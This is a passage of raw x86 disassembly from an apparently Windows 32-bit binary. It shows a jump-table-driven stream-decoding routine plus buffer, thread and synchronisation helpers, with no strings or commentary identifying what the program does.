  407251:	5f                   	pop    %edi
  407252:	8b c6                	mov    %esi,%eax
  407254:	5e                   	pop    %esi
  407255:	5d                   	pop    %ebp
  407256:	c3                   	ret
  407257:	56                   	push   %esi
  407258:	ff 75 14             	push   0x14(%ebp)
  40725b:	ff 75 10             	push   0x10(%ebp)
  40725e:	ff 75 0c             	push   0xc(%ebp)
  407261:	ff 75 08             	push   0x8(%ebp)
  407264:	e8 e1 fd ff ff       	call   0x40704a
  407269:	83 c4 14             	add    $0x14,%esp
  40726c:	8b f0                	mov    %eax,%esi
  40726e:	eb da                	jmp    0x40724a
  407270:	56                   	push   %esi
  407271:	57                   	push   %edi
  407272:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  407276:	8b 77 1c             	mov    0x1c(%edi),%esi
  407279:	83 a6 2c 05 00 00 00 	andl   $0x0,0x52c(%esi)
  407280:	83 a6 28 05 00 00 00 	andl   $0x0,0x528(%esi)
  407287:	8d 86 b0 1b 00 00    	lea    0x1bb0(%esi),%eax
  40728d:	89 86 b8 9b 00 00    	mov    %eax,0x9bb8(%esi)
  407293:	89 86 b4 9b 00 00    	mov    %eax,0x9bb4(%esi)
  407299:	c7 46 10 08 00 00 00 	movl   $0x8,0x10(%esi)
  4072a0:	8d 86 b0 9b 00 00    	lea    0x9bb0(%esi),%eax
  4072a6:	89 00                	mov    %eax,(%eax)
  4072a8:	8b 07                	mov    (%edi),%eax
  4072aa:	89 06                	mov    %eax,(%esi)
  4072ac:	8b 47 08             	mov    0x8(%edi),%eax
  4072af:	89 46 04             	mov    %eax,0x4(%esi)
  4072b2:	8b 47 04             	mov    0x4(%edi),%eax
  4072b5:	56                   	push   %esi
  4072b6:	89 46 08             	mov    %eax,0x8(%esi)
  4072b9:	c7 46 0c 00 00 20 00 	movl   $0x200000,0xc(%esi)
  4072c0:	e8 a3 0c 00 00       	call   0x407f68
  4072c5:	89 47 18             	mov    %eax,0x18(%edi)
  4072c8:	8b 46 08             	mov    0x8(%esi),%eax
  4072cb:	2b 47 04             	sub    0x4(%edi),%eax
  4072ce:	57                   	push   %edi
  4072cf:	89 47 0c             	mov    %eax,0xc(%edi)
  4072d2:	e8 ef fe ff ff       	call   0x4071c6
  4072d7:	59                   	pop    %ecx
  4072d8:	56                   	push   %esi
  4072d9:	8b 35 30 91 40 00    	mov    0x409130,%esi
  4072df:	ff d6                	call   *%esi
  4072e1:	57                   	push   %edi
  4072e2:	ff d6                	call   *%esi
  4072e4:	5f                   	pop    %edi
  4072e5:	33 c0                	xor    %eax,%eax
  4072e7:	5e                   	pop    %esi
  4072e8:	c3                   	ret
  4072e9:	68 c0 9b 00 00       	push   $0x9bc0
  4072ee:	6a 40                	push   $0x40
  4072f0:	ff 15 2c 91 40 00    	call   *0x40912c
  4072f6:	85 c0                	test   %eax,%eax
  4072f8:	75 01                	jne    0x4072fb
  4072fa:	c3                   	ret
  4072fb:	56                   	push   %esi
  4072fc:	8b 74 24 08          	mov    0x8(%esp),%esi
  407300:	50                   	push   %eax
  407301:	ff 76 2c             	push   0x2c(%esi)
  407304:	ff 76 28             	push   0x28(%esi)
  407307:	68 03 00 20 00       	push   $0x200003
  40730c:	ff 76 14             	push   0x14(%esi)
  40730f:	ff 76 10             	push   0x10(%esi)
  407312:	e8 30 fe ff ff       	call   0x407147
  407317:	83 c4 18             	add    $0x18,%esp
  40731a:	85 c0                	test   %eax,%eax
  40731c:	75 02                	jne    0x407320
  40731e:	5e                   	pop    %esi
  40731f:	c3                   	ret
  407320:	50                   	push   %eax
  407321:	68 70 72 40 00       	push   $0x407270
  407326:	ff 76 44             	push   0x44(%esi)
  407329:	e8 5d 08 00 00       	call   0x407b8b
  40732e:	83 c4 0c             	add    $0xc,%esp
  407331:	33 c0                	xor    %eax,%eax
  407333:	40                   	inc    %eax
  407334:	5e                   	pop    %esi
  407335:	c3                   	ret
  407336:	53                   	push   %ebx
  407337:	56                   	push   %esi
  407338:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40733c:	33 db                	xor    %ebx,%ebx
  40733e:	39 5e 38             	cmp    %ebx,0x38(%esi)
  407341:	74 47                	je     0x40738a
  407343:	89 5e 30             	mov    %ebx,0x30(%esi)
  407346:	89 5e 34             	mov    %ebx,0x34(%esi)
  407349:	89 5e 28             	mov    %ebx,0x28(%esi)
  40734c:	89 5e 2c             	mov    %ebx,0x2c(%esi)
  40734f:	e8 7d fd ff ff       	call   0x4070d1
  407354:	8b 46 44             	mov    0x44(%esi),%eax
  407357:	3b c3                	cmp    %ebx,%eax
  407359:	74 0a                	je     0x407365
  40735b:	50                   	push   %eax
  40735c:	e8 7a 07 00 00       	call   0x407adb
  407361:	59                   	pop    %ecx
  407362:	89 5e 44             	mov    %ebx,0x44(%esi)
  407365:	8b 46 1c             	mov    0x1c(%esi),%eax
  407368:	3b c3                	cmp    %ebx,%eax
  40736a:	57                   	push   %edi
  40736b:	8b 3d 30 91 40 00    	mov    0x409130,%edi
  407371:	74 06                	je     0x407379
  407373:	50                   	push   %eax
  407374:	ff d7                	call   *%edi
  407376:	89 5e 1c             	mov    %ebx,0x1c(%esi)
  407379:	8b 46 10             	mov    0x10(%esi),%eax
  40737c:	3b c3                	cmp    %ebx,%eax
  40737e:	74 06                	je     0x407386
  407380:	50                   	push   %eax
  407381:	ff d7                	call   *%edi
  407383:	89 5e 10             	mov    %ebx,0x10(%esi)
  407386:	89 5e 38             	mov    %ebx,0x38(%esi)
  407389:	5f                   	pop    %edi
  40738a:	5e                   	pop    %esi
  40738b:	5b                   	pop    %ebx
  40738c:	c3                   	ret
  40738d:	53                   	push   %ebx
  40738e:	55                   	push   %ebp
  40738f:	56                   	push   %esi
  407390:	8b 74 24 10          	mov    0x10(%esp),%esi
  407394:	57                   	push   %edi
  407395:	6a 0b                	push   $0xb
  407397:	5b                   	pop    %ebx
  407398:	6a 08                	push   $0x8
  40739a:	5d                   	pop    %ebp
  40739b:	33 ff                	xor    %edi,%edi
  40739d:	8b 46 48             	mov    0x48(%esi),%eax
  4073a0:	3b c3                	cmp    %ebx,%eax
  4073a2:	77 f9                	ja     0x40739d
  4073a4:	ff 24 85 f1 75 40 00 	jmp    *0x4075f1(,%eax,4)
  4073ab:	8b 4e 04             	mov    0x4(%esi),%ecx
  4073ae:	83 f9 01             	cmp    $0x1,%ecx
  4073b1:	0f 82 12 02 00 00    	jb     0x4075c9
  4073b7:	8b 06                	mov    (%esi),%eax
  4073b9:	89 7e 18             	mov    %edi,0x18(%esi)
  4073bc:	0f b6 10             	movzbl (%eax),%edx
  4073bf:	40                   	inc    %eax
  4073c0:	49                   	dec    %ecx
  4073c1:	89 56 18             	mov    %edx,0x18(%esi)
  4073c4:	89 06                	mov    %eax,(%esi)
  4073c6:	89 4e 04             	mov    %ecx,0x4(%esi)
  4073c9:	c7 46 48 02 00 00 00 	movl   $0x2,0x48(%esi)
  4073d0:	8b 4e 04             	mov    0x4(%esi),%ecx
  4073d3:	83 f9 01             	cmp    $0x1,%ecx
  4073d6:	0f 82 d6 00 00 00    	jb     0x4074b2
  4073dc:	8b 06                	mov    (%esi),%eax
  4073de:	33 d2                	xor    %edx,%edx
  4073e0:	8a 30                	mov    (%eax),%dh
  4073e2:	c7 46 48 03 00 00 00 	movl   $0x3,0x48(%esi)
  4073e9:	0f b7 d2             	movzwl %dx,%edx
  4073ec:	09 56 18             	or     %edx,0x18(%esi)
  4073ef:	40                   	inc    %eax
  4073f0:	49                   	dec    %ecx
  4073f1:	89 06                	mov    %eax,(%esi)
  4073f3:	89 4e 04             	mov    %ecx,0x4(%esi)
  4073f6:	8b 4e 04             	mov    0x4(%esi),%ecx
  4073f9:	83 f9 01             	cmp    $0x1,%ecx
  4073fc:	0f 82 b0 00 00 00    	jb     0x4074b2
  407402:	8b 06                	mov    (%esi),%eax
  407404:	0f b6 10             	movzbl (%eax),%edx
  407407:	c1 e2 10             	shl    $0x10,%edx
  40740a:	09 56 18             	or     %edx,0x18(%esi)
  40740d:	40                   	inc    %eax
  40740e:	49                   	dec    %ecx
  40740f:	89 06                	mov    %eax,(%esi)
  407411:	89 4e 04             	mov    %ecx,0x4(%esi)
  407414:	c7 46 48 04 00 00 00 	movl   $0x4,0x48(%esi)
  40741b:	8b 46 18             	mov    0x18(%esi),%eax
  40741e:	3b c7                	cmp    %edi,%eax
  407420:	75 10                	jne    0x407432
  407422:	39 7e 04             	cmp    %edi,0x4(%esi)
  407425:	75 0b                	jne    0x407432
  407427:	ff 46 3c             	incl   0x3c(%esi)
  40742a:	89 6e 48             	mov    %ebp,0x48(%esi)
  40742d:	e9 6b ff ff ff       	jmp    0x40739d
  407432:	3b 46 04             	cmp    0x4(%esi),%eax
  407435:	1b c0                	sbb    %eax,%eax
  407437:	83 c0 06             	add    $0x6,%eax
  40743a:	89 46 48             	mov    %eax,0x48(%esi)
  40743d:	e9 5b ff ff ff       	jmp    0x40739d
  407442:	39 7e 18             	cmp    %edi,0x18(%esi)
  407445:	89 7e 14             	mov    %edi,0x14(%esi)
  407448:	76 1d                	jbe    0x407467
  40744a:	8b 06                	mov    (%esi),%eax
  40744c:	8a 00                	mov    (%eax),%al
  40744e:	8b 4e 14             	mov    0x14(%esi),%ecx
  407451:	8b 56 10             	mov    0x10(%esi),%edx
  407454:	88 04 11             	mov    %al,(%ecx,%edx,1)
  407457:	ff 06                	incl   (%esi)
  407459:	ff 4e 04             	decl   0x4(%esi)
  40745c:	ff 46 14             	incl   0x14(%esi)
  40745f:	8b 46 14             	mov    0x14(%esi),%eax
  407462:	3b 46 18             	cmp    0x18(%esi),%eax
  407465:	72 e3                	jb     0x40744a
  407467:	c7 46 48 07 00 00 00 	movl   $0x7,0x48(%esi)
  40746e:	e9 2a ff ff ff       	jmp    0x40739d
  407473:	8b 46 18             	mov    0x18(%esi),%eax
  407476:	2b 46 14             	sub    0x14(%esi),%eax
  407479:	8b 4e 04             	mov    0x4(%esi),%ecx
  40747c:	3b c1                	cmp    %ecx,%eax
  40747e:	72 02                	jb     0x407482
  407480:	8b c1                	mov    %ecx,%eax
  407482:	33 c9                	xor    %ecx,%ecx
  407484:	3b c7                	cmp    %edi,%eax
  407486:	76 1f                	jbe    0x4074a7
  407488:	8b 16                	mov    (%esi),%edx
  40748a:	8b 5e 14             	mov    0x14(%esi),%ebx
  40748d:	8a 12                	mov    (%edx),%dl
  40748f:	8b 6e 10             	mov    0x10(%esi),%ebp
  407492:	03 d9                	add    %ecx,%ebx
  407494:	88 14 2b             	mov    %dl,(%ebx,%ebp,1)
  407497:	ff 06                	incl   (%esi)
  407499:	ff 4e 04             	decl   0x4(%esi)
  40749c:	41                   	inc    %ecx
  40749d:	3b c8                	cmp    %eax,%ecx
  40749f:	72 e7                	jb     0x407488
  4074a1:	6a 08                	push   $0x8
  4074a3:	5d                   	pop    %ebp
  4074a4:	6a 0b                	push   $0xb
  4074a6:	5b                   	pop    %ebx
  4074a7:	01 4e 14             	add    %ecx,0x14(%esi)
  4074aa:	8b 46 14             	mov    0x14(%esi),%eax
  4074ad:	3b 46 18             	cmp    0x18(%esi),%eax
  4074b0:	73 b5                	jae    0x407467
  4074b2:	33 c0                	xor    %eax,%eax
  4074b4:	e9 30 01 00 00       	jmp    0x4075e9
  4074b9:	56                   	push   %esi
  4074ba:	e8 2a fe ff ff       	call   0x4072e9
  4074bf:	85 c0                	test   %eax,%eax
  4074c1:	59                   	pop    %ecx
  4074c2:	0f 84 09 01 00 00    	je     0x4075d1
  4074c8:	83 46 28 01          	addl   $0x1,0x28(%esi)
  4074cc:	89 7e 14             	mov    %edi,0x14(%esi)
  4074cf:	11 7e 2c             	adc    %edi,0x2c(%esi)
  4074d2:	e9 f2 00 00 00       	jmp    0x4075c9
  4074d7:	8b 46 20             	mov    0x20(%esi),%eax
  4074da:	3b c7                	cmp    %edi,%eax
  4074dc:	74 1e                	je     0x4074fc
  4074de:	3b 46 24             	cmp    0x24(%esi),%eax
  4074e1:	74 11                	je     0x4074f4
  4074e3:	39 7e 0c             	cmp    %edi,0xc(%esi)
  4074e6:	74 ca                	je     0x4074b2
  4074e8:	c7 46 48 0a 00 00 00 	movl   $0xa,0x48(%esi)
  4074ef:	e9 a9 fe ff ff       	jmp    0x40739d
  4074f4:	89 7e 20             	mov    %edi,0x20(%esi)
  4074f7:	e9 a1 fe ff ff       	jmp    0x40739d
  4074fc:	ff 76 34             	push   0x34(%esi)
  4074ff:	ff 76 30             	push   0x30(%esi)
  407502:	e8 09 fc ff ff       	call   0x407110
  407507:	85 c0                	test   %eax,%eax
  407509:	59                   	pop    %ecx
  40750a:	59                   	pop    %ecx
  40750b:	74 0c                	je     0x407519
  40750d:	c7 46 48 09 00 00 00 	movl   $0x9,0x48(%esi)
  407514:	e9 84 fe ff ff       	jmp    0x40739d
  407519:	39 7e 3c             	cmp    %edi,0x3c(%esi)
  40751c:	74 31                	je     0x40754f
  40751e:	e8 c6 fb ff ff       	call   0x4070e9
  407523:	85 c0                	test   %eax,%eax
  407525:	75 1f                	jne    0x407546
  407527:	8b 46 28             	mov    0x28(%esi),%eax
  40752a:	3b 46 30             	cmp    0x30(%esi),%eax
  40752d:	75 17                	jne    0x407546
  40752f:	8b 46 2c             	mov    0x2c(%esi),%eax
  407532:	3b 46 34             	cmp    0x34(%esi),%eax
  407535:	75 0f                	jne    0x407546
  407537:	56                   	push   %esi
  407538:	e8 f9 fd ff ff       	call   0x407336
  40753d:	59                   	pop    %ecx
  40753e:	89 5e 48             	mov    %ebx,0x48(%esi)
  407541:	e9 57 fe ff ff       	jmp    0x40739d
  407546:	39 7e 3c             	cmp    %edi,0x3c(%esi)
  407549:	0f 85 4e fe ff ff    	jne    0x40739d
  40754f:	e8 95 fb ff ff       	call   0x4070e9
  407554:	3b 46 40             	cmp    0x40(%esi),%eax
  407557:	0f 83 40 fe ff ff    	jae    0x40739d
  40755d:	39 7e 04             	cmp    %edi,0x4(%esi)
  407560:	0f 84 4c ff ff ff    	je     0x4074b2
  407566:	89 7e 48             	mov    %edi,0x48(%esi)
  407569:	e9 2f fe ff ff       	jmp    0x40739d
  40756e:	8d 44 24 14          	lea    0x14(%esp),%eax
  407572:	50                   	push   %eax
  407573:	ff 76 34             	push   0x34(%esi)
  407576:	ff 76 30             	push   0x30(%esi)
  407579:	ff 76 1c             	push   0x1c(%esi)
  40757c:	e8 94 fc ff ff       	call   0x407215
  407581:	83 c4 10             	add    $0x10,%esp
  407584:	3b c7                	cmp    %edi,%eax
  407586:	89 46 24             	mov    %eax,0x24(%esi)
  407589:	74 57                	je     0x4075e2
  40758b:	39 7c 24 14          	cmp    %edi,0x14(%esp)
  40758f:	7c 51                	jl     0x4075e2
  407591:	83 46 30 01          	addl   $0x1,0x30(%esi)
  407595:	8b 46 1c             	mov    0x1c(%esi),%eax
  407598:	89 46 20             	mov    %eax,0x20(%esi)
  40759b:	11 7e 34             	adc    %edi,0x34(%esi)
  40759e:	eb 29                	jmp    0x4075c9
  4075a0:	8b 46 24             	mov    0x24(%esi),%eax
  4075a3:	2b 46 20             	sub    0x20(%esi),%eax
  4075a6:	8b 4e 0c             	mov    0xc(%esi),%ecx
  4075a9:	3b c8                	cmp    %eax,%ecx
  4075ab:	77 02                	ja     0x4075af
  4075ad:	8b c1                	mov    %ecx,%eax
  4075af:	3b c7                	cmp    %edi,%eax
  4075b1:	76 16                	jbe    0x4075c9
  4075b3:	8b 4e 20             	mov    0x20(%esi),%ecx
  4075b6:	8a 09                	mov    (%ecx),%cl
  4075b8:	8b 56 08             	mov    0x8(%esi),%edx
  4075bb:	88 0a                	mov    %cl,(%edx)
  4075bd:	ff 46 08             	incl   0x8(%esi)
  4075c0:	ff 46 20             	incl   0x20(%esi)
  4075c3:	ff 4e 0c             	decl   0xc(%esi)
  4075c6:	48                   	dec    %eax
  4075c7:	75 ea                	jne    0x4075b3
  4075c9:	89 6e 48             	mov    %ebp,0x48(%esi)
  4075cc:	e9 cc fd ff ff       	jmp    0x40739d
  4075d1:	6a fd                	push   $0xfffffffd
  4075d3:	5f                   	pop    %edi
  4075d4:	56                   	push   %esi
  4075d5:	89 5e 48             	mov    %ebx,0x48(%esi)
  4075d8:	e8 59 fd ff ff       	call   0x407336
  4075dd:	59                   	pop    %ecx
  4075de:	8b c7                	mov    %edi,%eax
  4075e0:	eb 07                	jmp    0x4075e9
  4075e2:	6a fe                	push   $0xfffffffe
  4075e4:	eb ed                	jmp    0x4075d3
  4075e6:	33 c0                	xor    %eax,%eax
  4075e8:	40                   	inc    %eax
  4075e9:	5f                   	pop    %edi
  4075ea:	5e                   	pop    %esi
  4075eb:	5d                   	pop    %ebp
  4075ec:	5b                   	pop    %ebx
  4075ed:	c3                   	ret
  4075ee:	8d 49 00             	lea    0x0(%ecx),%ecx
  4075f1:	ab                   	stos   %eax,%es:(%edi)
  4075f2:	73 40                	jae    0x407634
  4075f4:	00 ab 73 40 00 d0    	add    %ch,-0x2fffbf8d(%ebx)
  4075fa:	73 40                	jae    0x40763c
  4075fc:	00 f6                	add    %dh,%dh
  4075fe:	73 40                	jae    0x407640
  407600:	00 1b                	add    %bl,(%ebx)
  407602:	74 40                	je     0x407644
  407604:	00 42 74             	add    %al,0x74(%edx)
  407607:	40                   	inc    %eax
  407608:	00 73 74             	add    %dh,0x74(%ebx)
  40760b:	40                   	inc    %eax
  40760c:	00 b9 74 40 00 d7    	add    %bh,-0x28ffbf8c(%ecx)
  407612:	74 40                	je     0x407654
  407614:	00 6e 75             	add    %ch,0x75(%esi)
  407617:	40                   	inc    %eax
  407618:	00 a0 75 40 00 e6    	add    %ah,-0x19ffbf8b(%eax)
  40761e:	75 40                	jne    0x407660
  407620:	00 53 55             	add    %dl,0x55(%ebx)
  407623:	56                   	push   %esi
  407624:	8b 74 24 10          	mov    0x10(%esp),%esi
  407628:	33 ed                	xor    %ebp,%ebp
  40762a:	39 6e 38             	cmp    %ebp,0x38(%esi)
  40762d:	57                   	push   %edi
  40762e:	74 07                	je     0x407637
  407630:	56                   	push   %esi
  407631:	e8 00 fd ff ff       	call   0x407336
  407636:	59                   	pop    %ecx
  407637:	6a 40                	push   $0x40
  407639:	8d 7e 10             	lea    0x10(%esi),%edi
  40763c:	55                   	push   %ebp
  40763d:	57                   	push   %edi
  40763e:	e8 91 14 00 00       	call   0x408ad4
  407643:	8b 44 24 24          	mov    0x24(%esp),%eax
  407647:	50                   	push   %eax
  407648:	89 6e 30             	mov    %ebp,0x30(%esi)
  40764b:	89 6e 34             	mov    %ebp,0x34(%esi)
  40764e:	89 6e 28             	mov    %ebp,0x28(%esi)
  407651:	89 6e 2c             	mov    %ebp,0x2c(%esi)
  407654:	89 6e 3c             	mov    %ebp,0x3c(%esi)
  407657:	89 46 40             	mov    %eax,0x40(%esi)
  40765a:	e8 04 04 00 00       	call   0x407a63
  40765f:	8b 1d 2c 91 40 00    	mov    0x40912c,%ebx
  407665:	83 c4 10             	add    $0x10,%esp
  407668:	33 c9                	xor    %ecx,%ecx
  40766a:	3b c5                	cmp    %ebp,%eax
  40766c:	0f 94 c1             	sete   %cl
  40766f:	68 33 37 23 00       	push   $0x233733
  407674:	6a 40                	push   $0x40
  407676:	89 46 44             	mov    %eax,0x44(%esi)
  407679:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  40767d:	ff d3                	call   *%ebx
  40767f:	68 00 00 20 00       	push   $0x200000
  407684:	6a 40                	push   $0x40
  407686:	89 07                	mov    %eax,(%edi)
  407688:	ff d3                	call   *%ebx
  40768a:	33 c9                	xor    %ecx,%ecx
  40768c:	39 2f                	cmp    %ebp,(%edi)
  40768e:	89 46 1c             	mov    %eax,0x1c(%esi)
  407691:	0f 94 c1             	sete   %cl
  407694:	33 d2                	xor    %edx,%edx
  407696:	3b c5                	cmp    %ebp,%eax
  407698:	0f 94 c2             	sete   %dl
  40769b:	0b ca                	or     %edx,%ecx
  40769d:	09 4c 24 14          	or     %ecx,0x14(%esp)
  4076a1:	e8 fa f9 ff ff       	call   0x4070a0
  4076a6:	f7 d8                	neg    %eax
  4076a8:	1b c0                	sbb    %eax,%eax
  4076aa:	40                   	inc    %eax
  4076ab:	0b 44 24 14          	or     0x14(%esp),%eax
  4076af:	5f                   	pop    %edi
  4076b0:	f7 d8                	neg    %eax
  4076b2:	1b c0                	sbb    %eax,%eax
  4076b4:	40                   	inc    %eax
  4076b5:	89 46 38             	mov    %eax,0x38(%esi)
  4076b8:	5e                   	pop    %esi
  4076b9:	5d                   	pop    %ebp
  4076ba:	5b                   	pop    %ebx
  4076bb:	c3                   	ret
  4076bc:	53                   	push   %ebx
  4076bd:	56                   	push   %esi
  4076be:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4076c2:	57                   	push   %edi
  4076c3:	8d 46 0c             	lea    0xc(%esi),%eax
  4076c6:	33 ff                	xor    %edi,%edi
  4076c8:	50                   	push   %eax
  4076c9:	89 7e 08             	mov    %edi,0x8(%esi)
  4076cc:	ff 15 6c 91 40 00    	call   *0x40916c
  4076d2:	8b 1d 7c 91 40 00    	mov    0x40917c,%ebx
  4076d8:	57                   	push   %edi
  4076d9:	57                   	push   %edi
  4076da:	57                   	push   %edi
  4076db:	57                   	push   %edi
  4076dc:	ff d3                	call   *%ebx
  4076de:	3b c7                	cmp    %edi,%eax
  4076e0:	89 06                	mov    %eax,(%esi)
  4076e2:	75 08                	jne    0x4076ec
  4076e4:	89 7e 04             	mov    %edi,0x4(%esi)
  4076e7:	33 c0                	xor    %eax,%eax
  4076e9:	40                   	inc    %eax
  4076ea:	eb 1c                	jmp    0x407708
  4076ec:	57                   	push   %edi
  4076ed:	57                   	push   %edi
  4076ee:	6a 01                	push   $0x1
  4076f0:	57                   	push   %edi
  4076f1:	ff d3                	call   *%ebx
  4076f3:	3b c7                	cmp    %edi,%eax
  4076f5:	89 46 04             	mov    %eax,0x4(%esi)
  4076f8:	75 0c                	jne    0x407706
  4076fa:	ff 36                	push   (%esi)
  4076fc:	ff 15 1c 91 40 00    	call   *0x40911c
  407702:	89 3e                	mov    %edi,(%esi)
  407704:	eb e1                	jmp    0x4076e7
  407706:	33 c0                	xor    %eax,%eax
  407708:	5f                   	pop    %edi
  407709:	5e                   	pop    %esi
  40770a:	5b                   	pop    %ebx
  40770b:	c3                   	ret
  40770c:	56                   	push   %esi
  40770d:	8b 74 24 08          	mov    0x8(%esp),%esi
  407711:	8b 06                	mov    (%esi),%eax
  407713:	85 c0                	test   %eax,%eax
  407715:	57                   	push   %edi
  407716:	8b 3d 1c 91 40 00    	mov    0x40911c,%edi
  40771c:	74 03                	je     0x407721
  40771e:	50                   	push   %eax
  40771f:	ff d7                	call   *%edi
  407721:	8b 46 04             	mov    0x4(%esi),%eax
  407724:	85 c0                	test   %eax,%eax
  407726:	74 03                	je     0x40772b
  407728:	50                   	push   %eax
  407729:	ff d7                	call   *%edi
  40772b:	83 c6 0c             	add    $0xc,%esi
  40772e:	56                   	push   %esi
  40772f:	ff 15 70 91 40 00    	call   *0x409170
  407735:	5f                   	pop    %edi
  407736:	5e                   	pop    %esi
  407737:	c3                   	ret
  407738:	53                   	push   %ebx
  407739:	8b 1d 78 91 40 00    	mov    0x409178,%ebx
  40773f:	55                   	push   %ebp
  407740:	56                   	push   %esi
  407741:	8b 74 24 10          	mov    0x10(%esp),%esi
  407745:	57                   	push   %edi
  407746:	8d 7e 0c             	lea    0xc(%esi),%edi
  407749:	57                   	push   %edi
  40774a:	ff d3                	call   *%ebx
  40774c:	8b 2d 74 91 40 00    	mov    0x409174,%ebp
  407752:	ff 46 08             	incl   0x8(%esi)
  407755:	57                   	push   %edi
  407756:	ff d5                	call   *%ebp
  407758:	ff 74 24 18          	push   0x18(%esp)
  40775c:	ff d5                	call   *%ebp
  40775e:	6a ff                	push   $0xffffffff
  407760:	6a 00                	push   $0x0
  407762:	56                   	push   %esi
  407763:	6a 02                	push   $0x2
  407765:	ff 15 84 91 40 00    	call   *0x409184
  40776b:	3d 02 01 00 00       	cmp    $0x102,%eax
  407770:	89 44 24 14          	mov    %eax,0x14(%esp)
  407774:	75 0d                	jne    0x407783
  407776:	ff 74 24 18          	push   0x18(%esp)
  40777a:	ff d3                	call   *%ebx
  40777c:	33 c0                	xor    %eax,%eax
  40777e:	5f                   	pop    %edi
  40777f:	5e                   	pop    %esi
  407780:	5d                   	pop    %ebp
  407781:	5b                   	pop    %ebx
  407782:	c3                   	ret
  407783:	83 f8 ff             	cmp    $0xffffffff,%eax
  407786:	74 ee                	je     0x407776
  407788:	57                   	push   %edi
  407789:	ff d3                	call   *%ebx
  40778b:	ff 4e 08             	decl   0x8(%esi)
  40778e:	8b 46 08             	mov    0x8(%esi),%eax
  407791:	33 c9                	xor    %ecx,%ecx
  407793:	41                   	inc    %ecx
  407794:	39 4c 24 14          	cmp    %ecx,0x14(%esp)
  407798:	75 0a                	jne    0x4077a4
  40779a:	85 c0                	test   %eax,%eax
  40779c:	75 06                	jne    0x4077a4
  40779e:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  4077a2:	eb 05                	jmp    0x4077a9
  4077a4:	83 64 24 14 00       	andl   $0x0,0x14(%esp)
  4077a9:	57                   	push   %edi
  4077aa:	ff d5                	call   *%ebp
  4077ac:	83 7c 24 14 00       	cmpl   $0x0,0x14(%esp)
  4077b1:	74 19                	je     0x4077cc
  4077b3:	ff 76 04             	push   0x4(%esi)
  4077b6:	ff 15 80 91 40 00    	call   *0x409180
  4077bc:	85 c0                	test   %eax,%eax
  4077be:	75 0c                	jne    0x4077cc
  4077c0:	33 f6                	xor    %esi,%esi
  4077c2:	ff 74 24 18          	push   0x18(%esp)
  4077c6:	ff d3                	call   *%ebx
  4077c8:	8b c6                	mov    %esi,%eax
  4077ca:	eb b2                	jmp    0x40777e
  4077cc:	33 f6                	xor    %esi,%esi
  4077ce:	46                   	inc    %esi
  4077cf:	eb f1                	jmp    0x4077c2
  4077d1:	53                   	push   %ebx
  4077d2:	56                   	push   %esi
  4077d3:	57                   	push   %edi
  4077d4:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4077d8:	8d 5f 0c             	lea    0xc(%edi),%ebx
  4077db:	53                   	push   %ebx
  4077dc:	ff 15 78 91 40 00    	call   *0x409178
  4077e2:	33 c0                	xor    %eax,%eax
  4077e4:	3b 47 08             	cmp    0x8(%edi),%eax
  4077e7:	53                   	push   %ebx
  4077e8:	1b f6                	sbb    %esi,%esi
  4077ea:	f7 de                	neg    %esi
  4077ec:	ff 15 74 91 40 00    	call   *0x409174
  4077f2:	85 f6                	test   %esi,%esi
  4077f4:	74 0c                	je     0x407802
  4077f6:	ff 37                	push   (%edi)
  4077f8:	ff 15 88 91 40 00    	call   *0x409188
  4077fe:	85 c0                	test   %eax,%eax
  407800:	74 03                	je     0x407805
  407802:	33 c0                	xor    %eax,%eax
  407804:	40                   	inc    %eax
  407805:	5f                   	pop    %edi
  407806:	5e                   	pop    %esi
  407807:	5b                   	pop    %ebx
  407808:	c3                   	ret
  407809:	53                   	push   %ebx
  40780a:	56                   	push   %esi
  40780b:	57                   	push   %edi
  40780c:	8b 7c 24 10          	mov    0x10(%esp),%edi
  407810:	8d 5f 0c             	lea    0xc(%edi),%ebx
  407813:	53                   	push   %ebx
  407814:	ff 15 78 91 40 00    	call   *0x409178
  40781a:	33 c0                	xor    %eax,%eax
  40781c:	3b 47 08             	cmp    0x8(%edi),%eax
  40781f:	53                   	push   %ebx
  407820:	1b f6                	sbb    %esi,%esi
  407822:	f7 de                	neg    %esi
  407824:	ff 15 74 91 40 00    	call   *0x409174
  40782a:	85 f6                	test   %esi,%esi
  40782c:	74 0d                	je     0x40783b
  40782e:	ff 77 04             	push   0x4(%edi)
  407831:	ff 15 88 91 40 00    	call   *0x409188
  407837:	85 c0                	test   %eax,%eax
  407839:	74 03                	je     0x40783e
  40783b:	33 c0                	xor    %eax,%eax
  40783d:	40                   	inc    %eax
  40783e:	5f                   	pop    %edi
  40783f:	5e                   	pop    %esi
  407840:	5b                   	pop    %ebx
  407841:	c3                   	ret
  407842:	56                   	push   %esi
  407843:	8b 74 24 08          	mov    0x8(%esp),%esi
  407847:	ff 76 08             	push   0x8(%esi)
  40784a:	ff 56 04             	call   *0x4(%esi)
  40784d:	59                   	pop    %ecx
  40784e:	89 46 08             	mov    %eax,0x8(%esi)
  407851:	33 c0                	xor    %eax,%eax
  407853:	5e                   	pop    %esi
  407854:	c2 04 00             	ret    $0x4
  407857:	55                   	push   %ebp
  407858:	8b ec                	mov    %esp,%ebp
  40785a:	8b 45 14             	mov    0x14(%ebp),%eax
  40785d:	56                   	push   %esi
  40785e:	8b 75 08             	mov    0x8(%ebp),%esi
  407861:	89 46 08             	mov    %eax,0x8(%esi)
  407864:	8b 45 10             	mov    0x10(%ebp),%eax
  407867:	89 46 04             	mov    %eax,0x4(%esi)
  40786a:	8d 45 08             	lea    0x8(%ebp),%eax
  40786d:	50                   	push   %eax
  40786e:	6a 00                	push   $0x0
  407870:	56                   	push   %esi
  407871:	68 42 78 40 00       	push   $0x407842
  407876:	6a 00                	push   $0x0
  407878:	6a 00                	push   $0x0
  40787a:	ff 15 a4 90 40 00    	call   *0x4090a4
  407880:	85 c0                	test   %eax,%eax
  407882:	89 06                	mov    %eax,(%esi)
  407884:	5e                   	pop    %esi
  407885:	75 07                	jne    0x40788e
  407887:	5d                   	pop    %ebp
  407888:	ff 25 ec 90 40 00    	jmp    *0x4090ec
  40788e:	33 c0                	xor    %eax,%eax
  407890:	5d                   	pop    %ebp
  407891:	c3                   	ret
  407892:	55                   	push   %ebp
  407893:	8b ec                	mov    %esp,%ebp
  407895:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  407899:	74 2f                	je     0x4078ca
